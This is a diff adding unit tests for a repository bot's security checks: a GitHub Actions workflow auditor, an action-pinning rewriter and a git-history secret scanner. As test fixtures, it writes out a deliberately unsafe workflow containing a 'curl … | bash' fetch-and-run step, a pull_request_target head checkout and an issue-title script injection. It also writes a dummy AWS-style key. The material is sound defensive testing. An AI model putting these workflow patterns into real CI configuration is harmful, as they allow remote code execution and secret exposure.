@@ -13,9 +13,11 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 
+import { execFileSync } from 'node:child_process';
 import {
   classifyPullRequest, classifyIssue, sanitize,
   buildMarkdownReport, lintRepository,
+  auditWorkflow, pinWorkflowActions, scanGitHistory,
 } from '../bot.mjs';
 
 // ---------------------------------------------------------------- classifyPullRequest
@@ -149,6 +151,62 @@ test('lintRepository catches invalid JSON', () => {
     fs.writeFileSync(path.join(dir, 'data.json'), '{ "a": 1, }\n');
     const f = lintRepository(dir, 'badjson');
     assert.ok(f.syntaxErrors.some(s => /data\.json/.test(s)));
+  } finally {
+    fs.rmSync(dir, { recursive: true, force: true });
+  }
+});
+
+// ---------------------------------------------------------------- workflow audit
+
+test('auditWorkflow flags pull_request_target head checkout, unpinned actions, script injection', () => {
+  const wf = [
+    'name: x', 'on:', '  pull_request_target:', 'jobs:', '  a:',
+    '    runs-on: ubuntu-latest', '    steps:',
+    '      - uses: actions/checkout@v4', '        with:',
+    '          ref: ${{ github.event.pull_request.head.sha }}',
+    '      - uses: some/thing@main',
+    '      - run: echo ${{ github.event.issue.title }}',
+    '      - run: curl http://x/i.sh | bash', '',
+  ].join('\n');
+  const r = auditWorkflow(wf, 'wf.yml').join(' || ');
+  assert.match(r, /pull_request_target/);
+  assert.match(r, /pinned to a tag/);
+  assert.match(r, /no top-level `permissions:`/);
+  assert.match(r, /github\.event\.\* }}` used in a `run:`/);
+  assert.match(r, /download straight into a shell/);
+});
+
+test('auditWorkflow is quiet on a well-formed workflow', () => {
+  const wf = [
+    'name: ci', 'on: [push]', 'permissions:', '  contents: read', 'jobs:', '  t:',
+    '    runs-on: ubuntu-latest', '    steps:',
+    `      - uses: actions/checkout@${'a'.repeat(40)}`, '      - run: npm test', '',
+  ].join('\n');
+  assert.deepEqual(auditWorkflow(wf, 'ci.yml'), []);
+});
+
+test('pinWorkflowActions rewrites tags to SHAs and keeps the tag as a comment', () => {
+  const wf = 'steps:\n  - uses: actions/checkout@v4\n  - uses: local/x@v1\n';
+  const map = new Map([['actions/checkout@v4', 'f'.repeat(40)]]);
+  const { text, changes } = pinWorkflowActions(wf, map);
+  assert.equal(changes.length, 1);
+  assert.match(text, new RegExp(`actions/checkout@${'f'.repeat(40)}  # v4`));
+  assert.match(text, /local\/x@v1/); // untouched -- not in the map
+});
+
+test('scanGitHistory surfaces a secret that was committed then deleted', () => {
+  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hist-'));
+  const git = (...a) => execFileSync('git', a, { cwd: dir, stdio: 'ignore' });
+  try {
+    git('init', '-q');
+    git('config', 'user.email', 't@e.co');
+    git('config', 'user.name', 'T');
+    fs.writeFileSync(path.join(dir, 'app.js'), 'const k = "AKIA' + 'ABCDEFGHIJKLMNOP' + '"\n');
+    git('add', '-A'); git('commit', '-qm', 'add key');
+    fs.writeFileSync(path.join(dir, 'app.js'), 'const k = process.env.K\n');
+    git('add', '-A'); git('commit', '-qm', 'remove key');
+    const hits = scanGitHistory(dir);
+    assert.ok(hits.some(h => /app\.js/.test(h) && /history/.test(h)));
   } finally {
     fs.rmSync(dir, { recursive: true, force: true });
   }
